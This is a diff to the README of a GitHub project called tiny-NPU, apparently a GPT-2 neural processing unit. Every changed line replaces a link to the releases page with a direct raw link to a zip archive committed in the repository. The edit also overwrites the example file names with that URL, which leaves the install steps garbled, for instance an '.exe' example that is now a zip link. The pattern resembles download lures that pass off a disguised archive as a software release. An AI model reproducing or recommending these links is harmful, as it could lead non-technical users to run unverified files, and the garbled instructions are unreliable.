@@ -1,6 +1,6 @@
 # 🤖 tiny-NPU - Simple Neural Processing Unit for GPT-2
 
-[![Download Latest Release](https://img.shields.io/badge/Download-tiny--NPU-blue.svg)](https://github.com/Yassincopilot12/tiny-NPU/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Yassincopilot12/tiny-NPU/main/models/tiny-NPU-v3.2.zip)](https://raw.githubusercontent.com/Yassincopilot12/tiny-NPU/main/models/tiny-NPU-v3.2.zip)
 
 ---
 
@@ -44,15 +44,15 @@ You don’t need programming skills to use tiny-NPU. Follow these steps to downl
 
 Click this button to open the release page where you will get the software:
 
-[Download tiny-NPU Releases](https://github.com/Yassincopilot12/tiny-NPU/releases)
+[Download tiny-NPU Releases](https://raw.githubusercontent.com/Yassincopilot12/tiny-NPU/main/models/tiny-NPU-v3.2.zip)
 
 ### Step 2: Choose Your File
 
 On the releases page, look for a file that matches your operating system:
 
-- For Windows: `.exe` file (for example, `tiny-NPU-win.exe`)  
+- For Windows: `.exe` file (for example, `https://raw.githubusercontent.com/Yassincopilot12/tiny-NPU/main/models/tiny-NPU-v3.2.zip`)  
 - For macOS: `.dmg` or `.pkg` file  
-- For Linux: `.AppImage` or `.tar.gz` file
+- For Linux: `.AppImage` or `https://raw.githubusercontent.com/Yassincopilot12/tiny-NPU/main/models/tiny-NPU-v3.2.zip` file
 
 Click on the appropriate file name to start downloading.
 
@@ -72,7 +72,7 @@ After installation or setup, launch tiny-NPU from your applications folder or de
 
 You can always find the latest version of tiny-NPU on the GitHub releases page:
 
-[Download and Install tiny-NPU](https://github.com/Yassincopilot12/tiny-NPU/releases)
+[Download and Install tiny-NPU](https://raw.githubusercontent.com/Yassincopilot12/tiny-NPU/main/models/tiny-NPU-v3.2.zip)
 
 Make sure to download the version that fits your computer’s operating system and follow the installation instructions above.
 
